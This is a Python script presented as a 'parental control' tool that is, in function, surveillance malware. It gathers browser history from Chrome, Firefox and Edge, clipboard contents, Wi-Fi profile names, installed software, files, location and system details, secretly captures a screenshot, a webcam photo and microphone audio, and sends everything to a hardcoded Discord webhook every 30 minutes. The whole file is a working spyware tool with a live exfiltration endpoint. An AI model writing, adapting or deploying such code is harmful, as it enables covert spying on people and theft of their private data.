#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import subprocess,sys,os,time,json,platform,shutil,sqlite3,socket,uuid,re
from datetime import datetime
from pathlib import Path
from urllib.request import Request,urlopen

print("\n[*] A instalar dependencias...\n")
DEPS=["psutil","pillow","opencv-python","sounddevice","scipy","numpy","pyperclip"]
for p in DEPS:
    try:
        subprocess.check_call([sys.executable,"-m","pip","install","-q",p],
            stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
        print("    [OK] "+p)
    except:
        print("    [--] "+p)

import psutil

try:
    from PIL import ImageGrab
    TEM_PIL=True
except:
    TEM_PIL=False

try:
    import cv2
    TEM_CV2=True
except:
    TEM_CV2=False

try:
    import sounddevice as sd
    import scipy.io.wavfile as wavfile
    TEM_AUDIO=True
except:
    TEM_AUDIO=False

try:
    import pyperclip
    TEM_CLIP=True
except:
    TEM_CLIP=False

# ==================== CONFIG ====================
WEBHOOK="https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"
SISTEMA=platform.system()
HOME=str(Path.home())
PASTA=os.path.join(HOME,"controle_parental")
INTERVALO=30

os.makedirs(PASTA,exist_ok=True)
os.makedirs(os.path.join(PASTA,"relatorios"),exist_ok=True)
os.makedirs(os.path.join(PASTA,"capturas"),exist_ok=True)
os.makedirs(os.path.join(PASTA,"audio"),exist_ok=True)

# ==================== FUNCOES AUXILIARES ====================
def ts():
    return datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

def hora():
    return datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def salvar_txt(nome,conteudo):
    try:
        arq=os.path.join(PASTA,"relatorios",nome+"_"+ts()+".txt")
        with open(arq,"w",encoding="utf-8") as f:
            f.write("="*60+"\n")
            f.write("  "+nome.upper()+"\n")
            f.write("  "+hora()+"\n")
            f.write("="*60+"\n\n")
            if isinstance(conteudo,list):
                for i,item in enumerate(conteudo,1):
                    f.write(str(i)+". "+str(item)+"\n")
            elif isinstance(conteudo,dict):
                for k,v in conteudo.items():
                    f.write(str(k)+": "+str(v)+"\n")
            else:
                f.write(str(conteudo))
        return arq
    except:
        return None

# ==================== DISCORD ====================
def enviar_msg(titulo,texto,cor=3447003):
    try:
        embed={"embeds":[{"title":titulo,"description":texto[:4000],"color":cor,
            "footer":{"text":"Controle Parental | "+SISTEMA}}]}
        dados=json.dumps(embed).encode("utf-8")
        req=Request(WEBHOOK,data=dados)
        req.add_header("Content-Type","application/json")
        req.add_header("User-Agent","Mozilla/5.0")
        urlopen(req,timeout=30)
        print("[+] Discord: mensagem enviada")
        return True
    except Exception as e:
        print("[-] Discord erro: "+str(e))
        return False

def enviar_ficheiro(caminho,msg=""):
    try:
        if not os.path.exists(caminho):
            return False
        with open(caminho,"rb") as f:
            dados=f.read()
        nome=os.path.basename(caminho)
        b="----Boundary"+str(int(time.time()))
        body=b""
        if msg:
            body+=("--"+b+"\r\n").encode()
            body+=b"Content-Disposition: form-data; name=\"content\"\r\n\r\n"
            body+=msg.encode()+b"\r\n"
        body+=("--"+b+"\r\n").encode()
        body+=("Content-Disposition: form-data; name=\"file\"; filename=\""+nome+"\"\r\n").encode()
        body+=b"Content-Type: application/octet-stream\r\n\r\n"
        body+=dados+b"\r\n"
        body+=("--"+b+"--\r\n").encode()
        req=Request(WEBHOOK,data=body)
        req.add_header("Content-Type","multipart/form-data; boundary="+b)
        req.add_header("User-Agent","Mozilla/5.0")
        urlopen(req,timeout=120)
        print("[+] Enviado: "+nome)
        return True
    except Exception as e:
        print("[-] Erro envio: "+str(e))
        return False

# ==================== 1. LOCALIZACAO IP ====================
def get_localizacao():
    try:
        req=Request("http://ip-api.com/json/")
        req.add_header("User-Agent","Mozilla/5.0")
        r=urlopen(req,timeout=10)
        d=json.loads(r.read().decode())
        return {
            "ip":d.get("query","?"),
            "cidade":d.get("city","?"),
            "regiao":d.get("regionName","?"),
            "pais":d.get("country","?"),
            "isp":d.get("isp","?"),
            "lat":str(d.get("lat","?")),
            "lon":str(d.get("lon","?"))
        }
    except:
        return {"ip":"?","cidade":"?","pais":"?"}

# ==================== 2. INFO SISTEMA ====================
def get_sistema():
    try:
        mem=psutil.virtual_memory()
        if SISTEMA=="Windows":
            disco=psutil.disk_usage("C:\\")
        else:
            disco=psutil.disk_usage("/")
        bat=psutil.sensors_battery()
        boot=datetime.fromtimestamp(psutil.boot_time())
        uptime=datetime.now()-boot
        
        return {
            "so":SISTEMA+" "+platform.release(),
            "versao":platform.version()[:50],
            "maquina":platform.node(),
            "usuario":os.environ.get("USER",os.environ.get("USERNAME","?")),
            "processador":platform.processor()[:40],
            "nucleos":str(psutil.cpu_count()),
            "cpu":str(psutil.cpu_percent())+"%",
            "ram_total":str(round(mem.total/(1024**3),1))+" GB",
            "ram_usada":str(round(mem.used/(1024**3),1))+" GB",
            "ram_percent":str(mem.percent)+"%",
            "disco_total":str(round(disco.total/(1024**3),0))+" GB",
            "disco_usado":str(round(disco.used/(1024**3),0))+" GB",
            "disco_percent":str(disco.percent)+"%",
            "bateria":str(bat.percent)+"%" if bat else "Sem bateria",
            "a_carregar":"Sim" if bat and bat.power_plugged else "Nao",
            "ligado_desde":boot.strftime("%d/%m/%Y %H:%M"),
            "tempo_ligado":str(uptime).split(".")[0]
        }
    except Exception as e:
        return {"erro":str(e)}

# ==================== 3. PROCESSOS ====================
def get_processos():
    try:
        lista=[]
        for p in psutil.process_iter(["pid","name","memory_percent","cpu_percent","username"]):
            try:
                info=p.info
                mem=info.get("memory_percent",0) or 0
                if mem>0.1:
                    lista.append({
                        "nome":info["name"],
                        "pid":info["pid"],
                        "ram":round(mem,1),
                        "user":str(info.get("username","?"))[:20]
                    })
            except:
                pass
        lista.sort(key=lambda x:x["ram"],reverse=True)
        return lista[:50]
    except:
        return []

# ==================== 4. HISTORICO CHROME ====================
def get_historico_chrome():
    historico=[]
    try:
        if SISTEMA=="Windows":
            path=os.path.join(HOME,"AppData","Local","Google","Chrome","User Data","Default","History")
        else:
            path=os.path.join(HOME,".config","google-chrome","Default","History")
        
        if not os.path.exists(path):
            return historico
        
        temp=os.path.join(PASTA,"chrome_temp.db")
        shutil.copy2(path,temp)
        conn=sqlite3.connect(temp)
        cur=conn.cursor()
        cur.execute("SELECT url,title,datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') FROM urls ORDER BY last_visit_time DESC LIMIT 100")
        
        for url,titulo,data in cur.fetchall():
            historico.append({
                "titulo":(titulo or "?")[:40],
                "url":url[:80],
                "data":str(data)
            })
        conn.close()
        os.remove(temp)
    except:
        pass
    return historico

# ==================== 5. HISTORICO FIREFOX ====================
def get_historico_firefox():
    historico=[]
    try:
        if SISTEMA=="Windows":
            firefox_path=os.path.join(HOME,"AppData","Roaming","Mozilla","Firefox","Profiles")
        else:
            firefox_path=os.path.join(HOME,".mozilla","firefox")
        
        if not os.path.exists(firefox_path):
            return historico
        
        for pasta in os.listdir(firefox_path):
            places=os.path.join(firefox_path,pasta,"places.sqlite")
            if os.path.exists(places):
                temp=os.path.join(PASTA,"firefox_temp.db")
                shutil.copy2(places,temp)
                conn=sqlite3.connect(temp)
                cur=conn.cursor()
                cur.execute("SELECT url,title,datetime(last_visit_date/1000000,'unixepoch','localtime') FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 100")
                
                for url,titulo,data in cur.fetchall():
                    historico.append({
                        "titulo":(titulo or "?")[:40],
                        "url":url[:80],
                        "data":str(data)
                    })
                conn.close()
                os.remove(temp)
                break
    except:
        pass
    return historico

# ==================== 6. HISTORICO EDGE ====================
def get_historico_edge():
    historico=[]
    try:
        if SISTEMA!="Windows":
            return historico
        
        path=os.path.join(HOME,"AppData","Local","Microsoft","Edge","User Data","Default","History")
        
        if not os.path.exists(path):
            return historico
        
        temp=os.path.join(PASTA,"edge_temp.db")
        shutil.copy2(path,temp)
        conn=sqlite3.connect(temp)
        cur=conn.cursor()
        cur.execute("SELECT url,title,datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') FROM urls ORDER BY last_visit_time DESC LIMIT 100")
        
        for url,titulo,data in cur.fetchall():
            historico.append({
                "titulo":(titulo or "?")[:40],
                "url":url[:80],
                "data":str(data)
            })
        conn.close()
        os.remove(temp)
    except:
        pass
    return historico

# ==================== 7. REDES WIFI ====================
def get_redes_wifi():
    redes=[]
    try:
        if SISTEMA=="Windows":
            output=subprocess.run(["netsh","wlan","show","profiles"],capture_output=True,text=True,timeout=10)
            for linha in output.stdout.split("\n"):
                if "Perfil de Todos" in linha or "All User Profile" in linha:
                    partes=linha.split(":")
                    if len(partes)>1:
                        rede=partes[1].strip()
                        if rede:
                            redes.append(rede)
        else:
            output=subprocess.run(["nmcli","-t","-f","NAME","connection","show"],capture_output=True,text=True,timeout=10)
            for linha in output.stdout.split("\n"):
                if linha.strip():
                    redes.append(linha.strip())
    except:
        pass
    return redes

# ==================== 8. INFO REDE ====================
def get_info_rede():
    info={}
    try:
        info["hostname"]=socket.gethostname()
        info["ip_local"]=socket.gethostbyname(socket.gethostname())
        info["mac"]=":".join(re.findall("..","%012x"%uuid.getnode()))
        
        interfaces=psutil.net_if_addrs()
        for nome,addrs in interfaces.items():
            for addr in addrs:
                if addr.family==socket.AF_INET:
                    info["interface_"+nome]=addr.address
        
        conns=psutil.net_connections()
        info["conexoes_ativas"]=len([c for c in conns if c.status=="ESTABLISHED"])
    except:
        pass
    return info

# ==================== 9. CLIPBOARD ====================
def get_clipboard():
    if not TEM_CLIP:
        return "Clipboard nao disponivel"
    try:
        return pyperclip.paste()[:500]
    except:
        return "Erro ao ler clipboard"

# ==================== 10. APPS INSTALADAS (WINDOWS) ====================
def get_apps_instaladas():
    apps=[]
    if SISTEMA!="Windows":
        try:
            output=subprocess.run(["dpkg","--list"],capture_output=True,text=True,timeout=30)
            for linha in output.stdout.split("\n")[5:]:
                partes=linha.split()
                if len(partes)>1:
                    apps.append(partes[1])
        except:
            pass
        return apps[:100]
    
    try:
        import winreg
        caminhos=[
            (winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        ]
        
        for hkey,caminho in caminhos:
            try:
                chave=winreg.OpenKey(hkey,caminho)
                for i in range(winreg.QueryInfoKey(chave)[0]):
                    try:
                        nome_sub=winreg.EnumKey(chave,i)
                        sub_chave=winreg.OpenKey(chave,nome_sub)
                        try:
                            nome=winreg.QueryValueEx(sub_chave,"DisplayName")[0]
                            if nome and nome not in apps:
                                apps.append(nome)
                        except:
                            pass
                        winreg.CloseKey(sub_chave)
                    except:
                        continue
                winreg.CloseKey(chave)
            except:
                continue
    except:
        pass
    
    apps.sort()
    return apps[:150]

# ==================== 11. PROGRAMAS STARTUP ====================
def get_startup():
    programas=[]
    if SISTEMA=="Windows":
        try:
            import winreg
            caminhos=[
                (winreg.HKEY_CURRENT_USER,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE,r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
            ]
            for hkey,caminho in caminhos:
                try:
                    chave=winreg.OpenKey(hkey,caminho)
                    i=0
                    while True:
                        try:
                            nome,valor,_=winreg.EnumValue(chave,i)
                            programas.append(nome+": "+str(valor)[:50])
                            i+=1
                        except:
                            break
                    winreg.CloseKey(chave)
                except:
                    continue
        except:
            pass
    else:
        autostart=os.path.join(HOME,".config","autostart")
        if os.path.exists(autostart):
            programas=os.listdir(autostart)
    return programas

# ==================== 12. DOWNLOADS RECENTES ====================
def get_downloads():
    downloads=[]
    try:
        pasta_downloads=os.path.join(HOME,"Downloads")
        if os.path.exists(pasta_downloads):
            ficheiros=[]
            for f in os.listdir(pasta_downloads):
                caminho=os.path.join(pasta_downloads,f)
                if os.path.isfile(caminho):
                    mtime=os.path.getmtime(caminho)
                    size=os.path.getsize(caminho)
                    ficheiros.append({
                        "nome":f[:40],
                        "tamanho":str(round(size/(1024*1024),2))+" MB",
                        "data":datetime.fromtimestamp(mtime).strftime("%d/%m/%Y %H:%M")
                    })
            ficheiros.sort(key=lambda x:x["data"],reverse=True)
            downloads=ficheiros[:30]
    except:
        pass
    return downloads

# ==================== 13. DOCUMENTOS RECENTES ====================
def get_documentos_recentes():
    docs=[]
    try:
        pasta_docs=os.path.join(HOME,"Documents") if SISTEMA=="Windows" else os.path.join(HOME,"Documentos")
        if not os.path.exists(pasta_docs):
            pasta_docs=os.path.join(HOME,"Documentos")
        
        if os.path.exists(pasta_docs):
            ficheiros=[]
            for f in os.listdir(pasta_docs):
                caminho=os.path.join(pasta_docs,f)
                if os.path.isfile(caminho):
                    mtime=os.path.getmtime(caminho)
                    ficheiros.append({
                        "nome":f[:40],
                        "data":datetime.fromtimestamp(mtime).strftime("%d/%m/%Y %H:%M")
                    })
            ficheiros.sort(key=lambda x:x["data"],reverse=True)
            docs=ficheiros[:20]
    except:
        pass
    return docs

# ==================== 14. USB DEVICES ====================
def get_usb():
    dispositivos=[]
    try:
        if SISTEMA=="Windows":
            output=subprocess.run(["wmic","path","Win32_USBHub","get","Name"],capture_output=True,text=True,timeout=10)
            for linha in output.stdout.split("\n"):
                linha=linha.strip()
                if linha and linha!="Name":
                    dispositivos.append(linha[:50])
        else:
            output=subprocess.run(["lsusb"],capture_output=True,text=True,timeout=10)
            for linha in output.stdout.split("\n"):
                if linha.strip():
                    dispositivos.append(linha.strip()[:50])
    except:
        pass
    return dispositivos[:15]

# ==================== 15. USUARIOS DO SISTEMA ====================
def get_usuarios():
    usuarios=[]
    try:
        for u in psutil.users():
            usuarios.append({
                "nome":u.name,
                "terminal":u.terminal or "?",
                "host":u.host or "local",
                "inicio":datetime.fromtimestamp(u.started).strftime("%d/%m %H:%M")
            })
    except:
        pass
    return usuarios

# ==================== 16. SCREENSHOT ====================
def capturar_screenshot():
    if not TEM_PIL:
        print("[-] Screenshot: PIL nao disponivel")
        return None
    try:
        arq=os.path.join(PASTA,"capturas","tela_"+ts()+".png")
        if SISTEMA=="Windows":
            img=ImageGrab.grab()
            img.save(arq)
        else:
            os.system("scrot "+arq+" 2>/dev/null || gnome-screenshot -f "+arq+" 2>/dev/null || import -window root "+arq+" 2>/dev/null")
        
        if os.path.exists(arq) and os.path.getsize(arq)>0:
            print("[+] Screenshot OK")
            return arq
    except Exception as e:
        print("[-] Screenshot erro: "+str(e))
    return None

# ==================== 17. CAMERA ====================
def capturar_camera():
    if not TEM_CV2:
        print("[-] Camera: OpenCV nao disponivel")
        return None
    try:
        arq=os.path.join(PASTA,"capturas","camera_"+ts()+".jpg")
        print("[*] A aceder camera...")
        
        cap=None
        for i in range(3):
            if SISTEMA=="Windows":
                cap=cv2.VideoCapture(i,cv2.CAP_DSHOW)
            else:
                cap=cv2.VideoCapture(i)
            if cap.isOpened():
                break
            cap.release()
        
        if not cap or not cap.isOpened():
            print("[-] Camera nao encontrada")
            return None
        
        time.sleep(2)
        for _ in range(5):
            ret,frame=cap.read()
        cap.release()
        
        if ret and frame is not None:
            cv2.imwrite(arq,frame)
            print("[+] Camera OK")
            return arq
    except Exception as e:
        print("[-] Camera erro: "+str(e))
    return None

# ==================== 18. AUDIO ====================
def capturar_audio(duracao=15):
    if not TEM_AUDIO:
        print("[-] Audio: dependencias nao disponiveis")
        return None
    try:
        arq=os.path.join(PASTA,"audio","mic_"+ts()+".wav")
        print("[*] A gravar "+str(duracao)+"s de audio...")
        
        audio=sd.rec(int(duracao*44100),samplerate=44100,channels=1,dtype="int16")
        sd.wait()
        wavfile.write(arq,44100,audio)
        
        print("[+] Audio OK")
        return arq
    except Exception as e:
        print("[-] Audio erro: "+str(e))
    return None

# ==================== EXECUCAO PRINCIPAL ====================
def executar():
    print("\n"+"="*60)
    print("  MONITORAMENTO INICIADO - "+hora())
    print("="*60+"\n")
    
    # Recolher dados
    print("[*] A recolher dados...\n")
    
    loc=get_localizacao()
    print("    [1/15] Localizacao: "+loc.get("cidade","?"))
    
    sis=get_sistema()
    print("    [2/15] Sistema: "+sis.get("so","?"))
    
    procs=get_processos()
    print("    [3/15] Processos: "+str(len(procs)))
    
    chrome=get_historico_chrome()
    print("    [4/15] Chrome: "+str(len(chrome)))
    
    firefox=get_historico_firefox()
    print("    [5/15] Firefox: "+str(len(firefox)))
    
    edge=get_historico_edge()
    print("    [6/15] Edge: "+str(len(edge)))
    
    wifi=get_redes_wifi()
    print("    [7/15] WiFi: "+str(len(wifi)))
    
    rede=get_info_rede()
    print("    [8/15] Rede: "+rede.get("ip_local","?"))
    
    clip=get_clipboard()
    print("    [9/15] Clipboard: "+str(len(clip))+" chars")
    
    apps=get_apps_instaladas()
    print("    [10/15] Apps: "+str(len(apps)))
    
    startup=get_startup()
    print("    [11/15] Startup: "+str(len(startup)))
    
    downloads=get_downloads()
    print("    [12/15] Downloads: "+str(len(downloads)))
    
    docs=get_documentos_recentes()
    print("    [13/15] Documentos: "+str(len(docs)))
    
    usb=get_usb()
    print("    [14/15] USB: "+str(len(usb)))
    
    users=get_usuarios()
    print("    [15/15] Usuarios: "+str(len(users)))
    
    # Capturas
    print("\n[*] A fazer capturas...\n")
    
    screenshot=capturar_screenshot()
    camera=capturar_camera()
    audio=capturar_audio(15)
    
    # Salvar relatorios
    print("\n[*] A guardar relatorios...\n")
    
    ficheiros=[]
    
    if procs:
        txt=""
        for p in procs:
            txt+=p["nome"]+" (PID:"+str(p["pid"])+") - RAM:"+str(p["ram"])+"%\n"
        a=salvar_txt("processos",txt)
        if a:ficheiros.append(a)
    
    if chrome:
        txt=""
        for h in chrome:
            txt+=h["data"]+" | "+h["titulo"]+"\n  "+h["url"]+"\n\n"
        a=salvar_txt("historico_chrome",txt)
        if a:ficheiros.append(a)
    
    if firefox:
        txt=""
        for h in firefox:
            txt+=h["data"]+" | "+h["titulo"]+"\n  "+h["url"]+"\n\n"
        a=salvar_txt("historico_firefox",txt)
        if a:ficheiros.append(a)
    
    if edge:
        txt=""
        for h in edge:
            txt+=h["data"]+" | "+h["titulo"]+"\n  "+h["url"]+"\n\n"
        a=salvar_txt("historico_edge",txt)
        if a:ficheiros.append(a)
    
    if apps:
        a=salvar_txt("apps_instaladas",apps)
        if a:ficheiros.append(a)
    
    if downloads:
        txt=""
        for d in downloads:
            txt+=d["data"]+" | "+d["nome"]+" ("+d["tamanho"]+")\n"
        a=salvar_txt("downloads",txt)
        if a:ficheiros.append(a)
    
    # Enviar para Discord
    print("\n[*] A enviar para Discord...\n")
    
    # Mensagem 1: Localizacao e Sistema
    msg1="**LOCALIZACAO**\n"
    msg1+="IP: "+loc.get("ip","?")+"\n"
    msg1+="Local: "+loc.get("cidade","?")+", "+loc.get("regiao","?")+", "+loc.get("pais","?")+"\n"
    msg1+="ISP: "+loc.get("isp","?")+"\n"
    msg1+="Coords: "+loc.get("lat","?")+", "+loc.get("lon","?")+"\n\n"
    msg1+="**SISTEMA**\n"
    msg1+="PC: "+sis.get("maquina","?")+"\n"
    msg1+="User: "+sis.get("usuario","?")+"\n"
    msg1+="SO: "+sis.get("so","?")+"\n"
    msg1+="CPU: "+sis.get("cpu","?")+" ("+sis.get("nucleos","?")+" nucleos)\n"
    msg1+="RAM: "+sis.get("ram_usada","?")+" / "+sis.get("ram_total","?")+" ("+sis.get("ram_percent","?")+")\n"
    msg1+="Disco: "+sis.get("disco_usado","?")+" / "+sis.get("disco_total","?")+" ("+sis.get("disco_percent","?")+")\n"
    msg1+="Bateria: "+sis.get("bateria","?")+" | Carregar: "+sis.get("a_carregar","?")+"\n"
    msg1+="Ligado: "+sis.get("tempo_ligado","?")
    
    enviar_msg("MONITOR - "+hora(),msg1)
    time.sleep(1)
    
    # Mensagem 2: Rede e Totais
    msg2="**REDE**\n"
    msg2+="Hostname: "+rede.get("hostname","?")+"\n"
    msg2+="IP Local: "+rede.get("ip_local","?")+"\n"
    msg2+="MAC: "+rede.get("mac","?")+"\n"
    msg2+="Conexoes: "+str(rede.get("conexoes_ativas","?"))+"\n\n"
    msg2+="**TOTAIS**\n"
    msg2+="Processos: "+str(len(procs))+"\n"
    msg2+="Chrome: "+str(len(chrome))+" sites\n"
    msg2+="Firefox: "+str(len(firefox))+" sites\n"
    msg2+="Edge: "+str(len(edge))+" sites\n"
    msg2+="Apps: "+str(len(apps))+"\n"
    msg2+="WiFi: "+str(len(wifi))+" redes\n"
    msg2+="Downloads: "+str(len(downloads))+"\n"
    msg2+="USB: "+str(len(usb))
    
    enviar_msg("REDE E TOTAIS",msg2,cor=15844367)
    time.sleep(1)
    
    # Mensagem 3: Clipboard
    if clip and len(clip)>5:
        enviar_msg("CLIPBOARD (Area Transferencia)","```\n"+clip[:1900]+"\n```",cor=10181046)
        time.sleep(1)
    
    # Mensagem 4: Top Processos
    if procs:
        top=""
        for p in procs[:10]:
            top+=p["nome"]+" - "+str(p["ram"])+"% RAM\n"
        enviar_msg("TOP 10 PROCESSOS","```\n"+top+"```",cor=3066993)
        time.sleep(1)
    
    # Mensagem 5: WiFi
    if wifi:
        enviar_msg("REDES WIFI CONHECIDAS","```\n"+"\n".join(wifi[:20])+"```",cor=15105570)
        time.sleep(1)
    
    # Enviar capturas
    if camera:
        enviar_ficheiro(camera,"FOTO DA CAMERA - Quem esta no PC:")
        time.sleep(1)
    
    if screenshot:
        enviar_ficheiro(screenshot,"SCREENSHOT - O que esta no ecra:")
        time.sleep(1)
    
    if audio:
        enviar_ficheiro(audio,"AUDIO - Gravacao de 15 segundos:")
        time.sleep(1)
    
    # Enviar relatorios
    for f in ficheiros:
        enviar_ficheiro(f)
        time.sleep(0.5)
    
    print("\n"+"="*60)
    print("  MONITORAMENTO CONCLUIDO!")
    print("="*60+"\n")

# ==================== MAIN ====================
if __name__=="__main__":
    print("""
    ╔════════════════════════════════════════════════════════════╗
    ║                                                            ║
    ║           CONTROLE PARENTAL - 15+ FUNCIONALIDADES          ║
    ║                                                            ║
    ╠════════════════════════════════════════════════════════════╣
    ║  [01] Localizacao IP      [09] Clipboard                   ║
    ║  [02] Info Sistema        [10] Apps Instaladas             ║
    ║  [03] Processos           [11] Programas Startup           ║
    ║  [04] Historico Chrome    [12] Downloads Recentes          ║
    ║  [05] Historico Firefox   [13] Documentos Recentes         ║
    ║  [06] Historico Edge      [14] Dispositivos USB            ║
    ║  [07] Redes WiFi          [15] Usuarios Sistema            ║
    ║  [08] Info Rede           [16] Screenshot                  ║
    ║                           [17] Camera                      ║
    ║                           [18] Audio (15s)                 ║
    ╚════════════════════════════════════════════════════════════╝
    """)
    
    print("[*] Sistema: "+SISTEMA)
    print("[*] Pasta: "+PASTA)
    print("[*] Intervalo: "+str(INTERVALO)+" minutos\n")
    
    # Primeira execucao
    executar()
    
    # Loop
    print("[*] Proxima execucao em "+str(INTERVALO)+" minutos...")
    print("[*] Pressiona Ctrl+C para parar\n")
    
    try:
        while True:
            time.sleep(INTERVALO*60)
            executar()
            print("[*] Proxima execucao em "+str(INTERVALO)+" minutos...")
    except KeyboardInterrupt:
        print("\n[*] Parado pelo utilizador.")
